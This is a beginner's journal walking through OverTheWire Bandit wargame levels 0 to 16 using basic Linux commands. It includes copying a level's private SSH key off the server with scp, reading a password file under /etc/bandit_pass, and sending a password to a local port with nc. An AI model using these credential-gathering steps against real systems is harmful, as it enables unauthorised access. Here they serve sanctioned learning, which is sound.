---
title: "OverTheWire: Bandit Walkthrough"
type: lab-writeup
platform: OverTheWire
current_level: 33
status: complete
tags:
  - lab
  - wargame
  - linux
  - overthewire
aliases:
  - Over The Wire
  - Bandit
---

# OverTheWire: Bandit Learning Journal

Related notes:
- [[Linux Fundamentals]]
- [[Linux CLI Utilities]]
- [[Lab Tracker]]
- [[Learning Roadmap]]
- [[2026-10-15 - Cybersecurity Learning Session]]
- [[2026-10-16 - Cybersecurity Learning Session]]

> [!note] Password Storage
> Wargame passwords are kept securely out of Git in [[Bandit Passwords]].

---

## Overview
So, OverTheWire has different levels it wants you to complete. I am starting from Level 0.

In Level 0, it showed me that `man <command>` displays the user guide or documentation for a command, where you can type `/` to search for a specific keyword.

But for shell-builtin commands, you need to use `help <command>`.

So, **Level 0** had me SSH into their machine with the command:

```bash
ssh -p 2220 bandit.labs.overthewire.org -l bandit0
```

With the password:
```text
bandit0
```

---

## Level 1
Now I am moving to **Level 1**.

Level 1 has you working with a few commands:

| Command | Description |
|---|---|
| `ls` | To list files in the directory |
| `cd` | To move into a folder or out of one |
| `cat` | To print the content of the file in the terminal |
| `file` | To know the type and format of the file from the content itself |
| `du` | To know the amount of storage used by the file/folder |
| `find` | Find files |

The password for the next level is stored in a file called **`readme`**, located in the home directory. Use this password to log into `bandit1` using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.

### Steps I took to clear this level
I just did `ls`, and the file `readme` was just there. The password I got from it using `cat` was saved to [[Bandit Passwords]].

So I am exiting out of `bandit0` and logging into **`bandit1`** using this password.
I am inside `bandit1`.

> [!tip] Quick Solution
> `cat readme`

---

## Level 2
The password for the next level is stored in a file called **`-`**, located in the home directory.

For this, those same commands are given as "commands you may need to solve this level," but it needs us to find a file named `-`. Looking for _dashed filenames_ in Google.

Since CLI programs use the dash (`-`) to specify flags and options, we have two ways to bypass this issue:

- **The path prefix `./`:** Adding a relative path, for example, `./-`.
  ```bash
  bandit1@bandit:~$ cat ./-
  ```
- **The End-Of-Options Delimiter `--`:** Typing double-dash tells the command that all subsequent arguments are strictly filenames. (Google said this works, but it did not work for me.)
- But `cat < -` worked, as it gave me this:
  ```bash
  bandit1@bandit:~$ cat < -
  ```

> [!tip] Quick Solution
> `cat ./-` or `cat < -`

---

## Level 3
The password for the next level is stored in a file called **`--spaces in this filename--`**, located in the home directory.

For this level, however, `cat ./ --spaces in this filename--` does not work, as this command does not like spaces in commands.

I also tried this:
```bash
cat "--spaces in this filename--"
```
And escaping it also works: `cat \-\-spaces\ in\ this\ filename\-\-`.

> [!tip] Quick Solution
> `cat "--spaces in this filename--"`

---

## Level 4
The password for the next level is stored in a hidden file in the `inhere` directory.

Commands:
```bash
cd inhere
ls -la
cat .hidden-file-name
```

> [!tip] Quick Solution
> `ls -la inhere/` to find hidden files, then `cat inhere/.<filename>`

---

## Level 5
The password for the next level is stored in a file somewhere under the `inhere` directory and has all of the following properties: human-readable, 1033 bytes in size, not executable.

```bash
file inhere/*
```
Look for the one that says `ASCII text`.

> [!tip] Quick Solution
> `find inhere/ -size 1033c ! -executable`

---

## Level 6
The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7, owned by group bandit6, 33 bytes in size.

```bash
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
```

> [!tip] Quick Solution
> `find / -user bandit7 -group bandit6 -size 33c 2>/dev/null`
> **Takeaway:** `2>/dev/null` hides the sea of permission-denied errors.

---

## Level 7
The password for the next level is stored in the file **data.txt** next to the word **millionth**.

```bash
cat data.txt | grep millionth
```

> [!tip] Quick Solution
> `grep millionth data.txt`

---

## Level 8
The password for the next level is stored in the file **data.txt** next to the word **millionth**.

```text
Commands I may need to use to solve this: 
grep - (Global Regular Expression Print) used to search for specific words, phrases, or patterns inside files or outputs
sort - used to arrange lines of text files or command outputs in a specific order
uniq - used to filter out or report repeated lines from a text file or standard input (only checks the adjacent line)
strings - extracts and prints sequences of printable characters from files
base64 - to encode or decode data into Base64 format  
tr - used to translate delete or squeeze characters from standard input and write result to standard output
tar - bundle multiple files and directories into a single archive file 
gzip -compresses individual files to reduce their size
bzip2 -command line utility to compress and decompress giles
xxd - creates hexadecimal dumps of binary files and vice-versa
```

Before even looking up all these commands i just ran this:
```bash
cat data.txt | grep millionth
```
and it gave this output:
```text
millionth	<see [[Bandit Passwords]]>
```
I hope this works. And it did work.

I am stopping for today here. Use this command to get inside the terminal again:
```bash
ssh -p 2220 bandit.labs.overthewire.org -l bandit8
```
the password is the most recent one in the password file.

---

## Level 9
The password for the next level is stored in the file **data.txt** and is the only line of text that occurs only once.

Level 9 suggests i learn Piping and redirection from: https://ryanstutorials.net/linuxtutorial/piping.php

The ` > ` operator tells the command line to pass the program output to be saved in a file for eg.
```bash
dibij@Dibij:~/projects/CyberSecurity-Learning$ ls > tmp
dibij@Dibij:~/projects/CyberSecurity-Learning$ ls
tmp <----------- Here it is
dibij@Dibij:~/projects/CyberSecurity-Learning$ cat tmp
```
You can use the double ` >> ` operator to append to an existing file.

We can also send the data the other way using the ` < ` symbol. For example:
```bash
dibij@Dibij:~/projects/CyberSecurity-Learning$ wc -l  tmp 
9 tmp
dibij@Dibij:~/projects/CyberSecurity-Learning$ wc -l < tmp 
9
```
You can also combine both like this:
```bash
dibij@Dibij:~/projects/CyberSecurity-Learning$ wc -l < tmp1 > tmp
```

Now we need to Redirect STDERR - Error into a file.
To do this, we can stream STDERR into a file through an identifier which in this case would be ` 2 `.
For example:
```bash
dibij@Dibij:~/projects/CyberSecurity-Learning$ ls -l blah.foo tmp 2> errors.txt
dibij@Dibij:~/projects/CyberSecurity-Learning$ cat errors.txt 
ls: cannot access 'blah.foo': No such file or directory
```
But, we can only pass errors through this command, so to pass both the normal standard output and error message we could:
```bash
dibij@Dibij:~/projects/CyberSecurity-Learning$ ls -l blah.foo tmp > errors.txt 2>&1
```

> [!thought]- What the actual problem was & my thinking
> *The password for the next level is stored in the file **data.txt** and is the only line of text that occurs only once*
> So my thinking goes something like this:
> we need to find a unique line of text.
> - first, check / get texts from the file
> - second, use the uniq command to get the unique line
> so i know about linking, i will first write a command like ` strings data.txt | uniq`. Let me try this first.
> so i ran that command, and it gave me tons of of text strings, so unique just gave me all original text strings, i need to find one that shows the only one that occurs once, so i will investigate using ` man uniq `.
> Apparently it has an `-u --unique tag`, i hope it works.
> Again the same problem it just lists all unique values, how do we go about only finding the only string that does not get repeated twice? 
> I could use ` -c --count` maybe ? 
> `uniq ` just gives the unique ones, let me check `strings` command using `man strings`.
> I cant find anything on `man stings` i might need to go on google.
> 
> Well google says to look into the `sort` command. So here it is: I cant find a reliable way to look for the line of text that occurs only once. i might need to go deeper. 
> So i had to google it T.T but it worked, it needed me to combine 3 commands:
> `strings data.txt | sort | uniq -c`
> i was too dumb `strings data.txt` converts the file into each line of string, `sort` actually sorted them and `uniq -c` gave how many times those strings of line were repeated. but why did `strings data.txt | uniq -c` not work ? 
> I forgot what i wrote in this part in the command explanation part, uniq only looks at the line sequentially to it. Thats why we need to sort it.
> Well i have put up the password in [[Bandit Passwords]].

> [!tip] Quick Solution & Lesson
> `strings data.txt | sort | uniq -c` (or `sort data.txt | uniq -u`)
> **Takeaway:** `uniq` only checks adjacent lines! You MUST `sort` first.

---

## Level 10
The password for the next level is stored in the file **data.txt** in one of the few human-readable strings, preceded by several ‘=’ characters.

So, we need to find human readable strings, which would be done by strings? 
We also need to most likely use grep to find strings starting with several '='. i hope this is as easy as it sounds.
Well just `strings data.txt` got me the password, but i doubt this was intended
so ill send this new to grep to only get the ones where it starts with several '=' and then work through it .
Well i was able to get the password, i haven't tried loggin in with it yet but is this it ? 
This is most definitely not it. Let me look at the suggested commands and try again.
But i can't see anything that could help me here.
I am done with this level for now, maybe i will be back.

```text
bandit9@bandit:~$ strings data.txt | grep =
\========== the
q:=V
K	*=
=zZw
w=-1
vc.=
========== password
<u*========== is
=9$s
{=S[
;a =
lp>IoY-b==ld
========== < pwd here >
ec=}
	=ulD
```

> [!tip] Quick Solution
> `strings data.txt | grep "==="`

---

## Level 11
The password for the next level is stored in the file **data.txt**, which contains base64 encoded data.

Since it says *data.txt* contains base64 encoded data, we need to decode it using the `base64` command.
Before jumping in, i think this is the correct way to approach it:
```bash
bandit10@bandit:~$ base64 data.txt
```
but it just gives 2 line string, i think i need to lookup `man base64` to actually decode it.
Well apparently `-d` is the correct flag for it. Kinda dumb of me lol but i got the password.

> [!tip] Quick Solution
> `base64 -d data.txt`

---

## Level 12
The password for the next level is stored in the file **data.txt**, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions.

So:
`A` becomes `N`
`a` becomes `n`

So i ran this command:
```bash
bandit11@bandit:~$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
The password is <pwd>
```

> [!tip] Quick Solution
> `cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'` (ROT13)

---

## Level 13
The password for the next level is stored in the file **data.txt**, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work. Use mkdir with a hard to guess directory name. Or better, use the command “mktemp -d”. Then copy the datafile using cp, and rename it using mv (read the manpages!)

Ok so i am on an temporary folder:
```bash
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ dir
data.txt
```

### Step 1: Reverse the hexdump
```bash
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ xxd -r data.txt > binary
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ file binary
binary: gzip compressed data, was "data2.bin", last modified: Sat Sep 26 21:54:21 2026, max compression, from Unix, original size modulo 2^32 584
```
The output tells us that `binary` is a GZIP-compressed file.

### Step 2: Decompress using GZIP
Use `gunzip` to decompress the file. The `-c` option writes the decompressed contents to standard output, allowing us to redirect them into a new file.
```bash
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ gunzip -c binary > decompressed
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ file decompressed
decompressed: bzip2 compressed data, block size = 900k
```
The resulting file is compressed using BZIP2.

### Step 3: Decompress using BZIP2
```bash
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ bunzip2 -d decompressed
bunzip2: Can't guess original name for decompressed -- using decompressed.out
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ file decompressed.out
decompressed.out: gzip compressed data, was "data4.bin", last modified: Sat Sep 26 21:54:21 2026, max compression, from Unix, original size modulo 2^32 20480
```
BZIP2 decompression produces `decompressed.out`, which is another GZIP-compressed file.
The warning is harmless: BZIP2 could not determine the original filename, so it chose `decompressed.out`.

### Step 4: Decompress using GZIP again
```bash
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ gunzip -c decompressed.out > binary2
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ file binary2
binary2: POSIX tar archive (GNU)
```
The resulting file is a TAR archive. Unlike GZIP and BZIP2, TAR is an archive format that groups files together. We need to **extract** its contents rather than decompress it.

### Step 5: Extract the first TAR archive
Use `tar` with `--extract` (or `-x`) and `-f` to specify the archive filename.
```bash
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ tar --extract -f binary2
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ file data5.bin
data5.bin: POSIX tar archive (GNU)
```
The archive contains `data5.bin`, which is another TAR archive.
**Note:** Do not redirect the command to a file using `> tardecompressed`. TAR extracts files into the current directory; it does not print the extracted files' contents to standard output.

### Step 6: Extract the second TAR archive
```bash
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ tar --extract -f data5.bin
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ file data6.bin
data6.bin: POSIX tar archive (GNU)
```
The extracted `data6.bin` is also a TAR archive.

### Step 7: Extract the third TAR archive
```bash
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ tar --extract -f data6.bin
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", last modified: Sat Sep 26 21:54:21 2026, max compression, from Unix, original size modulo 2^32 49
```
The resulting `data8.bin` is GZIP-compressed. Although its embedded original filename is `data9.bin`, the file currently present in the directory is named `data8.bin`.

### Step 8: Decompress the final GZIP file
Use `gunzip -c` to print the decompressed contents directly to the terminal.
```bash
bandit12@bandit:/tmp/tmp.fCFgrNXhdN$ gunzip -c data8.bin
The password is [password displayed by the command]
```
**The password printed by this command is the password needed to log in as `bandit13`.**

> [!tip] Summary of the process
> | Step | Input file | Operation | Result |
> | --- | --- | --- | --- |
> | 1 | `data.txt` | Reverse hexdump with `xxd -r` | `binary` |
> | 2 | `binary` | GZIP decompression | `decompressed` |
> | 3 | `decompressed` | BZIP2 decompression | `decompressed.out` |
> | 4 | `decompressed.out` | GZIP decompression | `binary2` |
> | 5 | `binary2` | TAR extraction | `data5.bin` |
> | 6 | `data5.bin` | TAR extraction | `data6.bin` |
> | 7 | `data6.bin` | TAR extraction | `data8.bin` |
> | 8 | `data8.bin` | GZIP decompression | Password printed to terminal |
>
> **Key lesson:** Use `file` to identify each file's format before choosing the next operation. The filename extension does not necessarily tell you what format the file contains.

---

## **Level 14**
>The password for the next level is stored in **/etc/bandit_pass/bandit14 and can only be read by user bandit14**. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Look at the commands that logged you into previous bandit levels, and find out how to use the key for this level.  
If you need help with this level: a hint file can be found in the home directory.  
Make sure to read the error messages as they are informative.

*Thought process* : 
So the command that logged me into previous bandit levels was: 
`ssh -p 2220 bandit.labs.overthewire.org -l bandit13`
So there is a file that can only be read by bandit14, but i am logged in as bandit13. And this level only gives you a private SSH key so first i need to know how to use a ssh key with the ssh command. Also, it asks us to research more about several different new commands. Will Research and add them in [[Linux CLI Utilities]]

I googled a bit, and foundout that you can download files from remote client onto your local client using the `scp` command. 

Well from my research, i might need to use probably all the commands suggested by the problem. So here is my thinking again.
Honestly though this numbering has me confused, i am on level 14, but using bandit13 as username and password.
So i log in into it. see that the file is there 
```shell
bandit13@bandit:~$ ls -la 
total 28
drwxr-xr-x   2 root     root     4096 Sep 26 21:52 .
drwxr-xr-x 150 root     root     4096 Sep 26 21:56 ..
-rw-r--r--   1 root     root      220 Feb 13  2026 .bash_logout
-rw-r--r--   1 root     root     3851 Sep 26 21:38 .bashrc
-rw-r--r--   1 root     root      807 Feb 13  2026 .profile
-rw-r-----   1 bandit14 bandit13  467 Sep 26 21:52 HINT
-rw-r-----   1 bandit14 bandit13 2602 Sep 26 21:52 sshkey.private
```
Letme run `cat` on a those files
```shell
andit13@bandit:~$  cat sshkey.private
<it printed the file content>

```
What if i use piping commands like export the content of this cat onto a new file with umask, then use scp to get it outside, like in my local machine? ok letme try this

well there goes my idea, Permission denied

I am trying to use `chmod` here, but i dont even know what Mode argument to give it. so ill just google it , cause even `man chmod ` or `chmod --help` provided no clue.



FUCK THIS SHIT!!!!!!!!!
It was so easy, well not exactly easy but like i know about the `ssh -i` flag, but i also read this line that i misunderstood the line went something like 
>The current version of OverTheWire prevents logging in from one
   level to another via localhost. Log out, and see 1)

But now google says i can just move the file from home.bandit13 into a tmp using `install` command.
I never even looked at the install command because i thought its just the basic one. But apparently not, it is 
`cp + chmod` in one command. 
So i first move it into or install the sshkey.private file into tmp where i can edit or whatever and use that as the identity flag and login into level 14 
And this runs on the assumption that Gemini gave me here

>You **do not** need to download the file to your local computer. Remember, you are already inside a Linux environment. You can SSH _from_ the Bandit server _to_... well, localhost (bandit14)!

so here goes my command
```bash
bandit13@bandit:~$ install -m 600 sshkey.private /tmp/tmp.Jr3k6uRfVo/my_key
bandit13@bandit:~$ cd /tmp/tmp.Jr3k6uRfVo
bandit13@bandit:/tmp/tmp.Jr3k6uRfVo$ dir
my_key
bandit13@bandit:/tmp/tmp.Jr3k6uRfVo$ cat my_key 
-----BEGIN OPENSSH PRIVATE KEY-----

```
well it fucking worked upuntill this command.
Now to passthis using the identity symbol 
```bash
bandit13@bandit:/tmp/tmp.Jr3k6uRfVo$ ssh -i my_key -p 2220 bandit.labs.overthewire.org -l bandit14
The authenticity of host '[bandit.labs.overthewire.org]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is: SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

```
This didnot work, google fucking lied to me fucker. SBut since, i have full access to the file i can use scp to get it in my local linux

Fuckk, I didnot save the scp command, letme look it up, but letme try it without looking it up from memory. well i forgot
```shell
bandit13@bandit:/tmp/tmp.Jr3k6uRfVo$ scp -P 2220 bandit13@bandit.labs.overthewire.org:/tmp/tmp.Jr3k6uRfVo/my_key /home/dibij/projects/CyberSecurity-Learning
The authenticity of host '[bandit.labs.overthewire.org]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is: SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Y
Please type 'yes', 'no' or the fingerprint: yes
Could not create directory '/home/bandit13/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts).
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

!!! You are trying to log into this SSH server from localhost.
!!! Connecting from/to localhost is blocked to conserve resources.
!!! Please log out and log in again, directly from your client machine.

backend: gibson-1
Received disconnect from 127.0.0.1 port 2220:2: no authentication methods enabled
Disconnected from 127.0.0.1 port 2220
scp: Connection closed
bandit13@bandit:/tmp/tmp.Jr3k6uRfVo$ 

```
even this didnot work ? maybe because i am inside bandit servers? letme try it outside in my local machine for once.
Ok i got this 
```shell
bandit13@bandit:/tmp/tmp.Jr3k6uRfVo$ exit
logout
Connection to bandit.labs.overthewire.org closed.
dibij@Dibij:~/projects/CyberSecurity-Learning$ scp -P 2220 bandit13@bandit.labs.overthewire.org:/tmp/tmp.Jr3k6uRfVo/my_key /home/dibij/projects/CyberSecurity-Learning/
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit13@bandit.labs.overthewire.org's password: 
Permission denied, please try again.
bandit13@bandit.labs.overthewire.org's password: 
my_key                                                                    100% 2602     4.2KB/s   00:00    
dibij@Dibij:~/projects/CyberSecurity-Learning$ ls -la
total 32
drwxr-xr-x 1 dibij dibij 4096 Oct 17 19:28  .
drwxr-xr-x 1 dibij dibij    0 Oct 15 16:41  ..
drwxr-xr-x 1 dibij dibij 4096 Oct 17 18:08  .git
-rwxr-xr-x 1 dibij dibij  233 Oct 17 18:04  .gitignore
drwxr-xr-x 1 dibij dibij 4096 Oct 15 18:57  .obsidian
drwxr-xr-x 1 dibij dibij    0 Oct 15 16:47  '00 - Dashboard'
drwxr-xr-x 1 dibij dibij 4096 Oct 17 17:57  '01 - Journal'
drwxr-xr-x 1 dibij dibij 4096 Oct 16 21:26  '02 - Fundamentals'
drwxr-xr-x 1 dibij dibij    0 Oct 16 21:24  '03 - Tools'
drwxr-xr-x 1 dibij dibij    0 Oct 16 21:23  '04 - Labs and Experiments'
drwxr-xr-x 1 dibij dibij    0 Oct 16 21:27  '05 - Projects'
drwxr-xr-x 1 dibij dibij 4096 Oct 16 21:28  '06 - Templates'
-rwxr-xr-x 1 dibij dibij 1530 Oct 17 18:07  README.md
drwxr-xr-x 1 dibij dibij    0 Oct 17 18:04  _secrets
-rwxr-xr-x 1 dibij dibij 2602 Oct 17 19:28  my_key
drwxr-xr-x 1 dibij dibij    0 Oct 17 18:30  pass
```
Now letme pass this file to next level

now what new iisue is this ?? 
```shell 
dibij@Dibij:~/projects/CyberSecurity-Learning$ ssh -i my_key -p 2220 bandit.labs.overthewire.org -l bandit14
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0755 for 'my_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "my_key": bad permissions
bandit14@bandit.labs.overthewire.org's password: 
```
Since i dont know the password, nor the mode identifiers to make this only accessible by me, we probably either use chmod or umask so lemme look up the syntax
Apparetnyl chmod 600 locks the file so only the owner can view it, this should be secure enough.

Well even `chmod 600 my_key` didnot work because this project is basically a symlink project from windows d drive to this linux, and apparently windows NTFS so i will create a linux based file at /tmp
Finally motherfucker
```bash
ibij@Dibij:~/projects/CyberSecurity-Learning$ mv my_key  /tmp/random_key_for_bandit 
dibij@Dibij:~/projects/CyberSecurity-Learning$ dir /tmp/
mcp-PzuQsM
node-compile-cache
random_key_for_bandit
snap-private-tmp
systemd-private-59b68d1cda0e4bbd98118394a28f0442-ModemManager.service-itJKZs
systemd-private-59b68d1cda0e4bbd98118394a28f0442-bluetooth.service-G5WYCr
systemd-private-59b68d1cda0e4bbd98118394a28f0442-chrony.service-YG2EbM
systemd-private-59b68d1cda0e4bbd98118394a28f0442-colord.service-2SlYtc
systemd-private-59b68d1cda0e4bbd98118394a28f0442-fwupd.service-ICdvGf
systemd-private-59b68d1cda0e4bbd98118394a28f0442-polkit.service-KanVSc
systemd-private-59b68d1cda0e4bbd98118394a28f0442-power-profiles-daemon.service-xP2LlY
systemd-private-59b68d1cda0e4bbd98118394a28f0442-switcheroo-control.service-z2L6i9
systemd-private-59b68d1cda0e4bbd98118394a28f0442-systemd-logind.service-kBuFQd
systemd-private-59b68d1cda0e4bbd98118394a28f0442-upower.service-xWIpPp
unleash-repo-schema-v1-codeium-language-server.json
vscode-ah-be523e38b7f6
dibij@Dibij:~/projects/CyberSecurity-Learning$ chmod 600 /tmp/random_key_for_bandit 
dibij@Dibij:~/projects/CyberSecurity-Learning$ ls -la /tmp
total 472
drwxrwxrwt 20 root  root     480 Oct 17 19:39 .
drwxr-xr-x 20 root  root    4096 Sep  8 01:56 ..
drwxrwxrwt  2 root  root      40 Oct 17  2026 .ICE-unix
-r--r--r--  1 dibij dibij     11 Oct 17 17:51 .X0-lock
-r--r--r--  1 dibij dibij     11 Oct 17 17:51 .X1-lock
drwxrwxrwt  2 root  root      80 Oct 17 17:51 .X11-unix
drwxrwxrwt  2 root  root      40 Oct 17  2026 .XIM-unix
drwxrwxrwt  2 root  root      40 Oct 17  2026 .font-unix
drwx------  2 dibij dibij     60 Oct 17 18:02 mcp-PzuQsM
drwxrwxr-x  3 dibij dibij     60 Oct 17 18:02 node-compile-cache
-rw-------  1 dibij dibij   2602 Oct 17 19:28 random_key_for_bandit
drwx------  6 root  root     120 Oct 17 18:00 snap-private-tmp
drwx------  3 root  root      60 Oct 17  2026 systemd-private-59b68d1cda0e4bbd98118394a28f0442-ModemManager.service-itJKZs
drwx------  3 root  root      60 Oct 17  2026 systemd-private-59b68d1cda0e4bbd98118394a28f0442-bluetooth.service-G5WYCr
drwx------  3 root  root      60 Oct 17  2026 systemd-private-59b68d1cda0e4bbd98118394a28f0442-chrony.service-YG2EbM
drwx------  3 root  root      60 Oct 17 17:51 systemd-private-59b68d1cda0e4bbd98118394a28f0442-colord.service-2SlYtc
drwx------  3 root  root      60 Oct 17 19:24 systemd-private-59b68d1cda0e4bbd98118394a28f0442-fwupd.service-ICdvGf
drwx------  3 root  root      60 Oct 17  2026 systemd-private-59b68d1cda0e4bbd98118394a28f0442-polkit.service-KanVSc
drwx------  3 root  root      60 Oct 17 17:51 systemd-private-59b68d1cda0e4bbd98118394a28f0442-power-profiles-daemon.service-xP2LlY
drwx------  3 root  root      60 Oct 17  2026 systemd-private-59b68d1cda0e4bbd98118394a28f0442-switcheroo-control.service-z2L6i9
drwx------  3 root  root      60 Oct 17  2026 systemd-private-59b68d1cda0e4bbd98118394a28f0442-systemd-logind.service-kBuFQd
drwx------  3 root  root      60 Oct 17  2026 systemd-private-59b68d1cda0e4bbd98118394a28f0442-upower.service-xWIpPp
-rw-rw-r--  1 dibij dibij 463641 Oct 17 18:02 unleash-repo-schema-v1-codeium-language-server.json
drwx------  2 dibij dibij     60 Oct 17 18:01 vscode-ah-be523e38b7f6
dibij@Dibij:~/projects/CyberSecurity-Learning$ ssh -i /tmp/random_key_for_bandit -p 2220 bandit.labs.overthewire.org -l bandit14
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to the #wargames channel on
discord or IRC.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
  restricted so that users cannot snoop on eachother. Files and directories
  with easily guessable or short names will be periodically deleted! The /tmp
  directory is regularly wiped.
  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few useful tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

bandit14@bandit:~$ 


```
I have finally logged into bandit14 dayumm.
Now to get the password
 I got the password and saved it at [[Bandit Passwords]]

> [!tip] Quick Solution & Key Lessons
> 1. **Copy key to client (outside server):**
>    ```bash
>    scp -P 2220 bandit13@bandit.labs.overthewire.org:/tmp/tmp.Jr3k6uRfVo/my_key /home/dibij/projects/CyberSecurity-Learning/
>    ```
> 2. **WSL / Windows NTFS Gotcha:**
>    NTFS partitions mounted in WSL ignore standard Linux `chmod` file permission modes, leaving the file at `0755` (`WARNING: UNPROTECTED PRIVATE KEY FILE!`).
>    **Fix:** Move the key to a native Linux path like `/tmp/` and set strict permissions:
>    ```bash
>    mv my_key /tmp/random_key_for_bandit
>    chmod 600 /tmp/random_key_for_bandit
>    ```
> 3. **Login with Identity File (`-i`):**
>    ```bash
>    ssh -i /tmp/random_key_for_bandit -p 2220 bandit.labs.overthewire.org -l bandit14
>    ```
> 4. **Retrieve Password:**
>    ```bash
>    cat /etc/bandit_pass/bandit14
>    ```

---

## Level 15
**Objective:** The password for the next level can be retrieved by submitting the password of the current level to **port 30000 on localhost**.

Useful commands to investigate: `nc` (netcat), `ncat`, `telnet`, `openssl`, `s_client`.

Ok so, initial assumptions.
I have to send the password used to get into this level to port 30000 on localhost, so immediately i thought of nc and ran this command
`bandit14@bandit:~$ nc localhost 30000`
But its stuck at this 
maybe, i need to send something, letme send a random piece of text:
```
bandit14@bandit:~$ echo "abcd" | nc localhost 30000
Wrong! Please enter the correct current password.
bandit14@bandit:~$ 
```

So i am thinking in correct way. Let me just give up the password like this.
```
bandit14@bandit:~$ echo "pwd here" | nc localhost 30000
Correct!
new pwd
```
Well, i got it right, moving onto next step.

> [!tip] Quick Solution
> Submit the current level's password directly to the listening service:
> ```bash
> echo "<bandit14_password>" | nc localhost 30000
> ```

---

## **Level 16**
>The password for the next level can be retrieved by submitting the password of the current level to **port 30001 on localhost** using SSL/TLS encryption.
